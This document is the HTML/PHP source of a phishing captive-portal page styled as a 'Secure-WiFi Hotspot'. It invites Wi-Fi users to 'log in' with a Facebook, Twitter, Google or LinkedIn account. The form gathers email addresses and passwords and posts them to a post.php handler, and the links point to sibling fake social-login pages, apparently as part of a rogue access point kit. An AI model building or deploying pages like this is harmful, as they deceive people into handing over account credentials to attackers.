<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
<title>Secure-WiFi Hotspot</title>
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<meta name="author" content="Secure-WiFi">
	<meta name="description" content="Your One Stop Secure WiFi Connection.">

<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
<link rel="stylesheet" href="style.css" type="text/css">

</head>
<body>

	<div class="inner-container">

<ul id="icons">
	<li><a href="../facebook-login/" title="facebook" class="tooltip"><img src="social/fb.png" alt="" class="icon"></a></li>
	<li><a href="../twitter-login/" title="twitter" class="tooltip"><img src="social/twitter.png" alt="" class="icon"></a></li>
        <li><a href="../google-login/" title="google" class="tooltip"><img src="social/gplus.png" alt="" class="icon"></a></li>
        <li><a href="#" title="linkedin" class="tooltip"><img src="social/linkedin.png" alt="" class="icon"></a></li>
</ul>	
<div class="box">
      <h1>Login</h1><form action="post.php" method="post">
<select name="socialn" class="list">
		<option value="facebook">Facebook</option>
		<option value="twitter">Twitter</option>
		<option value="googlep" selected>Google</option>
		<option value="linkedin">Linkedin</option>
	</select>
      <input type="emailadd" name="email" required placeholder="Email"/>
      <input type="password" name="userpassword" required placeholder="Password"/>
      <input type="hidden" name="uuid" value="<?=date('H:i:s');echo '-';echo rand(1,10);?>">
      <input type="submit" value="Login" value="Send" class="button">
</form>
      <p><img src="images/secure-wifi.png" class="lock">Secure-Wifi<br><small>No registration required. 
         Login with your social account.</small></p>
    </div>
</div>

<div class="social-icons"></div>

</body>
</html>

